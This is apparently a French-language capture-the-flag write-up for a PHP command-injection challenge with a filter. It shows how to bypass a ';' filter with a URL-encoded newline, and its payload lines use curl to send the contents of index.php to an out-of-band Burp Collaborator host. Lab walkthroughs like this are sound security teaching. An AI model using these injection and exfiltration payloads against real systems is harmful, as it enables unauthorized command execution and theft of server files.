

Tout d'abord, voyons voir ce qui nous est dit dans l'énoncé. 

![](../img/Pasted%20image%2020261014230435.png)

Bon, rappelons-nous de l'ancien challenge, qui est un challenge d'injection de commande en PHP.

Il suffisait de finir la ligne avec le caractère ";" puis d'injecter des commandes comme par exemple : 

```bash
ls -la
```

etc... 

Ici, il nous est précisé qu'il y a une couche de sécurité en plus. 

Cela peut être dû, par exemple, à un filtre du caractère ";" ou autre. C'est ce que nous allons voir actuellement. 


Bon, voyons comment se présente le site. 

![](../img/Pasted%20image%2020261014230937.png)

Pour l'instant, nous pouvons voir comme quoi le site à toujours le même design. Voyons voir maintenant comment il se comporte lorsqu'on effectue un ping depuis celui-ci. 

![](../img/Pasted%20image%2020261014231033.png)

Il n'y a rien à signaler du côté du fonctionnement du ping, le paquet ICMP a bel et bien été transmis à l'adresse visée qui est l'adresse de loopback 127.0.0.1. 

Par contre, nous pouvons voir comme quoi le résultat n'est pas directement affiché sur le site, comparé au premier challenge qui montre directement le nombre de paquets qui ont été transmis et le statut de la commande directement sur le navigateur. 

Retenons une théorie, qui est que si l'affichage ne se fait pas sur la page web directement, il va falloir la rediriger sur un site tel que webhook.site ou même dans le collaborateurs de burpsuite.

Maintenant récupérons la requête via Burpsuite. 

![](../img/Pasted%20image%2020261014231547.png)

Parfait, maintenant voyons voir ce qu'il y a dans la réponse. 

Nous venons d'effectuer un ping simple comme juste avant. On peut remarquer que celui-ci a bel et bien fonctionné car nous avons le message "Ping Ok". 

Nous pouvons remarquer qu'il y a un Header nommé "Vary" et que celui-ci détient une valeur "Accept-Encoding".

Ce qui veut dire que nous avons la possibilité sûrement d'utiliser de l'encodage URL pour pouvoir effectuer du code arbitraire ou autre.


Voyons voir maintenant si le caractère ";" est celui-ci bloqué ou non.

![](../img/Pasted%20image%2020261014232528.png)


On peut remarquer que le ping s'effectue bel et bien. Mais essayons maintenant de rentrer du code arbitraire, vous verrez ici que n'importe quelle commande Unix ne marche simplement pas à la suite du caractère ";".


![](../img/Pasted%20image%2020261014232634.png)


![](../img/Pasted%20image%2020261014232651.png)

Nous pouvons remarquer que sur nos différents tests effectués, nous avons une "Syntax Error". 

Maintenant nous allons essayer d'encoder le caractère ";".

![](../img/Pasted%20image%2020261014232953.png)


Toujours normal, nous obtenons une Syntax Error, ce qui veut dire que cela n'a tout simplement pas marché.

Maintenant que nous avons écarté cette possibilité, il faut se rappeler que nous pouvons simplement en PHP sauter de ligne pour dire que nous allons exécuter une prochaine commande. Globalement, on met de préférence chaque fois un ";" en PHP, sauf si c'est pour enchaîner plusieurs commandes.  On peut soit imaginer qu'il y a déjà un ";" ce qui donne ";" ";" ce qui n'est pas bon donc => Syntax Error, ou soit que celui-ci trie le caractère ";" et donc que nous pouvons simplement faire un retour à la ligne "LF" comme par exemple "\r\n" ou "\n". Cela dépend du serveur s'il est sur système UNIX ou Windows.

Pour ce faire, nous allons encoder le caractère 
```
"

"

```
Ici, entre les guillemets, c'est pour vous dire explicitement que le caractère que nous allons encoder est le caractère de saut de ligne.


Dans mon cas, je suis habitué à utiliser Cyberchef qui est un projet open-source et sur lequel il y a plusieurs options d'encodage et de décodage telles que l'URL Encode qui va nous servir. 

https://gchq.github.io/CyberChef/#recipe=URL_Encode(false)

À l'intérieur, je vais simplement appuyer sur entrer. 

![](../img/Pasted%20image%2020261014233738.png)


Nous pouvons voir que le résultat donné est %0a, c'est donc ce que nous allons utiliser.

Maintenant, essayons de faire un écho "test" pour voir si cela donne une erreur ou simplement un "Ping Ok". Si cela nous donne un Ping Ok, nous allons pouvoir simplement récupérer la page index.php comme demandé dans l'énoncé.


![](../img/Pasted%20image%2020261014234414.png)


Ok, nous remarquons que le "Ping Ok" est bel et bien apparu, ce qui veut dire que la commande écho "test" vient d'être effectuée et n'a pas été filtrée.

Nous allons récupérer le collaborator pour récupérer la requête http via curl. 



![](../img/Pasted%20image%2020261014234659.png)


Cliquer sur le carré orange, celui-ci va copier dans votre presse papier l'URL donnée par Burpsuite.

Maintenant que votre lien est copié, nous allons essayer d'effectuer un curl pour voir si notre serveur récupère la requête. 

N'OUBLIEZ PAS DE RAJOUTER http:// DEVANT VOTRE LIEN ! 

On se retrouve donc avec : 

```bash
ip=127.0.0.1%0acurl+http://Votre_lien_copier
```

Pour ma part cela me donne : 

```bash
ip=127.0.0.1%0acurl+http://ple70m7531ee2cdvwaqd6ps67xdo1jp8.oastify.com
```

![](../img/Pasted%20image%2020261014235743.png)


Parfait, allons voir notre onglet Collaborator : 

![](../img/Pasted%20image%2020261014235821.png)

Il faut savoir que si cela met du temps, je vous conseille de cliquer sur "Poll now".

Voyons voir la réponse de notre requête HTTP : 

![](../img/Pasted%20image%2020261015000302.png)


Nous pouvons voir qu'il y a ABSOLUMENT rien du tout. Mais ne vous découragez pas.

Il se peut que le serveur ne nous montre pas de façon explicite et qu'il va falloir aller chercher plus loin avec des options dans curl. Et c'est ce que nous allons actuellement faire. 

Si nous cherchons plus profondément dans les options de curl, nous pouvons voir une option qui s'appelle 
```bash
--data-urlencode
```

Ce qui est parfait pour nous, car si vous vous intéressez à l'option (voici le lien : https://everything.curl.dev/http/post/url-encode.html#url-encode-data). Vous pouvez remarquer qu'elle permet d'encoder en URL le contenu que nous souhaitons envoyer et que nous n'avons pas encore encodé.  

Ici, nous allons la combiner avec  "@nom_fichier" qui va nous permettre de charger les données à partir d'un fichier indiqué.

Mais quel fichier devons-nous choisir ? " Nous le savons grâce à l'énoncé qui nous dit qu'il faut aller chercher le flag dans le fichier index.php.


Ce qui nous donne : 

```bash
curl+--data-urlencode+"@index.php"+http://votre_lien
```


Ce qui faut envoyer : 

```bash
ip=127.0.0.1%0acurl+--data-urlencode+"@index.php"+http://votre_lien
```

Pour ma part cela donne : 

![](../img/Pasted%20image%2020261015001600.png)

Comme vous pouvez le voir, cela a fonctionné, maintenant il va falloir aller récupérer la requête dans collaborator et l'analyser.



![](../img/Pasted%20image%2020261015001836.png)


Okay, nous venons de recevoir ce que l'on voulait qui était le contenu de la page index.html. 

Maintenant, deux options s'offrent à vous : soit vous faites confiance à Burpsuite, vous sélectionnez puis dans Inspector cela va décoder automatiquement, soit vous allez sur un site comme Cyberchef. 

Personnellement, je fais confiance à Burpsuite sur la rapidité car il suffit de sélectionner. 

![](../img/Pasted%20image%2020261015002108.png)


Nous pouvons voir que le flag est dans le contenu du fichier qui est ici caché, car je ne souhaite pas que vous puissiez tricher. Faites-vous-même, cela va vous permettre d'apprendre en effectuant les commandes. 


Maintenant, il suffit de remplacer dans notre payload @index.php par le fichier qui est appelé.

![](../img/Pasted%20image%2020261015002428.png)


![](../img/Pasted%20image%2020261015002539.png)

Bingo, maintenant essayons de valider le challenge avec le flag : 

![](../img/Pasted%20image%2020261015002619.png)

Bien joué ! On se retrouve pour un prochain challenge ! 